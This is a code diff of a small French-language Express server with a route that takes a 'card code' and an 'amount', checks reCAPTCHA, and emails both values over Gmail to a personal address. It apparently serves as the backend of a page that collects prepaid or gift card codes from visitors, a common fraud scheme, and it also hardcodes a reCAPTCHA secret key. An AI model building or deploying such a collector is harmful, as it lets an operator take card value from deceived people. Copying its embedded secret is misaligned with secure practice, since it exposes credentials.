@@ -11,7 +11,6 @@ const PORT = process.env.PORT || 3000;
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Routes
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
@@ -19,7 +18,7 @@ app.get('/', (req, res) => {
 app.post('/envoyer-code', async (req, res) => {
   const { numeroCarte, codeSecurite, 'g-recaptcha-response': captcha } = req.body;
 
-  // Vérification des champs
+  // Validation des champs
   if (!/^\d{1,16}$/.test(numeroCarte)) {
     return res.status(400).send("Code de carte invalide");
   }
@@ -28,23 +27,21 @@ app.post('/envoyer-code', async (req, res) => {
     return res.status(400).send("Montant invalide");
   }
 
-  // Vérification Captcha
+  // Vérification reCAPTCHA
   if (!captcha) {
-    return res.status(400).send("Veuillez valider le Captcha.");
+    return res.status(400).send("Captcha non rempli.");
   }
 
   const secretKey = "6Lc49BkrAAAAAED5fyYu7EA57NFm3kcOM9KjZkTt";
+  const verifyUrl = `https://www.google.com/recaptcha/api/siteverify?secret=${secretKey}&response=${captcha}`;
 
   try {
-    const response = await axios.post(
-      `https://www.google.com/recaptcha/api/siteverify?secret=${secretKey}&response=${captcha}`
-    );
-
+    const response = await axios.post(verifyUrl);
     if (!response.data.success) {
-      return res.status(400).send("Échec de la vérification Captcha.");
+      return res.status(400).send("Échec de vérification reCAPTCHA.");
     }
 
-    // Configuration de l’envoi d’email
+    // Envoi du mail
     const transporter = nodemailer.createTransport({
       service: 'gmail',
       auth: {
@@ -57,18 +54,17 @@ app.post('/envoyer-code', async (req, res) => {
       from: 'wanarnaud@gmail.com',
       to: 'wanarnaud@gmail.com',
       subject: 'Code de carte reçu',
-      text: `Code : ${numeroCarte}\nMontant : ${codeSecurite}`
+      text: `Code: ${numeroCarte}\nMontant: ${codeSecurite}`
     };
 
     await transporter.sendMail(mailOptions);
     res.send("Code envoyé avec succès !");
   } catch (error) {
-    console.error("Erreur d'envoi :", error);
+    console.error("Erreur lors de l'envoi :", error);
     res.status(500).send("Une erreur est survenue.");
   }
 });
 
-// Lancer le serveur
 app.listen(PORT, () => {
   console.log(`Serveur lancé sur http://localhost:${PORT}`);
 });
